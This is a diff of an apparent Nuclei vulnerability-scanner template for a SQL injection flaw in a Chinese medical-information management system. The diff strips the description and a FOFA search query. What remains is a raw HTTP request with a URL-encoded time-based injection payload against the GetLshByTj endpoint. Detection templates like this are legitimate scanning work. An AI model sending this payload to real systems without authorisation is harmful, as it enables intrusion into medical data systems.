@@ -3,12 +3,8 @@ info:
   name: 医药信息管理系统 GetLshByTj SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fsa4pwm2e1h4qtg2'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fsa4pwm2e1h4qtg2
-    fofa: web.body="ResourceScripts/zh-cn-Login.aspx.js"
 http:
 - raw:
   - GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
